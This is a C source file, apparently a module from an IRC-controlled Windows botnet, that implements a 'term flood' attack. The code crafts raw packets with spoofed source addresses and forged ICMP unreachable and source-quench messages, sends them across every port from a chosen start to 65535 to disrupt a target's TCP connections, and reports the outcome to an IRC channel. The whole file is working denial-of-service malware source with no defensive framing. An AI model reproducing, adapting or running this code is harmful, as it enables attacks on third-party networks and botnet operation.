#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_TERM
/* Define the IP header */
typedef struct ip_hdr2 {
        unsigned char ip_verlen; /* IP version & length */
        unsigned char ip_tos; /* IP type of service */
        unsigned short ip_totallength; /* Total length */
        unsigned short ip_id; /* Unique identifier */
        unsigned short ip_offset; /* Fragment offset field */
        unsigned char ip_ttl; /* Time to live */
        unsigned char ip_protocol; /* Protocol */
        unsigned short ip_checksum; /* IP checksum */
        unsigned int ip_srcaddr; /* Source address */
        unsigned int ip_destaddr; /* Destination address */
} IP_HDR, *PIP_HDR;


/* Define the ICMP header */
/* Destination Unreachable Message */
typedef struct icmp_hdr {
        unsigned char type; /* Type */
        unsigned char code; /* Code */
        unsigned short checksum; /* Checksum */
        unsigned long unused; /* Unused */
} ICMP_HDR, *PICMP_HDR;


/* 64 bits of Original Data Datagram (TCP header) */
char msg[] =
	"\x00\x50" /* Source port */
	"\x00\x50" /* Destination port */
	"\x23\x48\x4f\x44";

DWORD WINAPI TermFloodThread(LPVOID param) 
{
	TERMFLOOD termflood = *((TERMFLOOD *)param);
	TERMFLOOD *termfloods = (TERMFLOOD *)param;
	termfloods->gotinfo = true;

	DWORD dwToIP, dwFromIP; 
	unsigned int iFromPort, iToPort;
	int iDelay;

	SOCKET s;
	SOCKADDR_IN remote;
	IP_HDR ipHdr,
		ipHdrInc;
	ICMP_HDR icmpHdr;
	int ret;
	unsigned long i, p, lTimerCount=0;
	unsigned short iTotalSize,
		iIPVersion,
		iIPSize,
		p2,
		cksum = 0;
	char buf[4096], /*packet size*/
		*ptr = NULL;

	IN_ADDR addr;

	if ((dwToIP=finet_addr(termflood.ip)) == INADDR_NONE) {
		sprintf(sendbuf,"[TERM]: Invalid target IP.");
		if (!termflood.silent) irc_privmsg(termflood.sock,termflood.chan,sendbuf,termflood.notice);
		addlog(sendbuf);

		clearthread(termflood.threadnum);

		ExitThread(EXIT_FAILURE);
	}
	
	dwFromIP = dwToIP+((rand()%512)+256);
	iFromPort = brandom(1,1024);
	iToPort = termflood.port;
	iDelay = termflood.delay;

	s = fsocket(AF_INET, SOCK_RAW, IPPROTO_UDP);

	bool bOpt = 1;
	ret = fsetsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
	if (ret == SOCKET_ERROR) ExitThread(EXIT_FAILURE);


	/* Initalize the IP header */
	iTotalSize = sizeof(ipHdr) + sizeof(icmpHdr) + sizeof(msg)-1 + sizeof(ipHdrInc);

	iIPVersion = 4;
	iIPSize = sizeof(ipHdr) / sizeof(unsigned long);

	ipHdr.ip_verlen			= (iIPVersion << 4) | iIPSize;
	ipHdr.ip_tos			= 0; /* IP type of service */
	ipHdr.ip_totallength	= htons(iTotalSize); /* Total packet len */
	ipHdr.ip_id				= htons(42451); /* Unique identifier */
	ipHdr.ip_offset			= 0; /* Fragment offset field */
	ipHdr.ip_ttl			= 255; /* Time to live */
	ipHdr.ip_protocol		= 0x1; /* Protocol(ICMP) */
	ipHdr.ip_checksum		= 0; /* IP checksum */
	ipHdr.ip_srcaddr		= dwFromIP; /* Source address */
	ipHdr.ip_destaddr		= dwToIP; /* Destination address */


	ipHdrInc.ip_verlen		= (iIPVersion << 4) | iIPSize;
	ipHdrInc.ip_tos			= 0; /* IP type of service */
	ipHdrInc.ip_totallength = htons(sizeof(ipHdrInc)+20); /* Total packet len */
	ipHdrInc.ip_id			= htons(25068); /* Unique identifier */
	ipHdrInc.ip_offset		= 0; /* Fragment offset field */
	ipHdrInc.ip_ttl			= 255; /* Time to live */
	ipHdrInc.ip_protocol	= 0x6; /* Protocol(TCP) */
	ipHdrInc.ip_checksum	= 0; /* IP checksum */
	ipHdrInc.ip_srcaddr		= dwToIP; /* Source address */
	ipHdrInc.ip_destaddr	= dwFromIP;/* Destination address */


	/* Initalize the ICMP header */
	icmpHdr.checksum = 0;

	int attack;
	if (termflood.type == 0 || termflood.type > 3)
		attack = brandom(1,3);
	else
		attack = termflood.type;
	char msg[50];
	if (attack == 1) {
		sprintf(msg,"Protocol Unreachable Message");
		icmpHdr.type = 3; /* Destination Unreachable Message */
		icmpHdr.code = 2; /* protocol unreachable */
		icmpHdr.unused = 0;
	} else if (attack == 2) {
		sprintf(msg,"Destination Unreachable Message");
		icmpHdr.type = 3; /* Destination Unreachable Message */
		icmpHdr.code = 4; /* fragmentation needed and DF set */
		icmpHdr.unused = 0x44000000; /* next-hop MTU - 68 */
	} else {
		sprintf(msg,"Source Quench Message");
		icmpHdr.type = 4; /* Source Quench Message */
		icmpHdr.code = 0;
		icmpHdr.unused = 0;
	}

	memset(buf, 0, sizeof(buf));
	ptr = buf;

	memcpy(ptr, &ipHdr, sizeof(ipHdr)); ptr += sizeof(ipHdr);
	memcpy(ptr, &icmpHdr, sizeof(icmpHdr)); ptr += sizeof(icmpHdr);
	memcpy(ptr, &ipHdrInc, sizeof(ipHdrInc)); ptr += sizeof(ipHdrInc);
	memcpy(ptr, msg, sizeof(msg)-1);
	iFromPort = htons(iFromPort);
	memcpy(ptr, &iFromPort, 2);

	remote.sin_family = AF_INET;
	remote.sin_port = htons(iToPort);
	remote.sin_addr.s_addr = dwToIP;

	cksum = checksum((unsigned short *)&ipHdrInc, 20);
	memcpy(buf+20+sizeof(icmpHdr)+10, &cksum, 2);

	cksum = checksum((unsigned short *)&ipHdr, 20);
	memcpy(buf+10, &cksum, 2);

	for (p = iToPort; p <= 65535; p++) {
		p2 = fhtons((short)p);
		memcpy((char *)(ptr+2), &p2, 2);
		buf[22] = 0;
		buf[23] = 0;
		cksum = checksum((unsigned short *)(buf+20), sizeof(icmpHdr)+28);
		memcpy(buf+20+2, &cksum, 2);

		ret = fsendto(s, buf, iTotalSize, 0, (SOCKADDR *)&remote, sizeof(remote));

		if (ret == SOCKET_ERROR) 
			break;
	}

	fclosesocket(s);

	sprintf(sendbuf,"[TERM]: Done attacking IP: %s with: %s", termflood.ip, msg);
	if (!tcpflood.silent) irc_privmsg(tcpflood.sock, tcpflood.chan, sendbuf, tcpflood.notice); 
	addlog(sendbuf);

	clearthread(termflood.threadnum);

	ExitThread(EXIT_SUCCESS);
}
#endif